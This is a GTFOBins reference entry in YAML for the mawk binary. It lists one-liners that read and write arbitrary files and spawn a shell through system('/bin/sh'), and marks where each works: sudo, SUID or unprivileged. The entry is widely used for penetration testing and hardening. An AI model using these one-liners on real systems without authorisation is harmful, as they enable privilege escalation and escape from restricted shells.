<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/mawk -->
---
functions:
  file-read:
  - code: |-
      mawk '//' /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      mawk 'BEGIN {system("/bin/sh")}'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
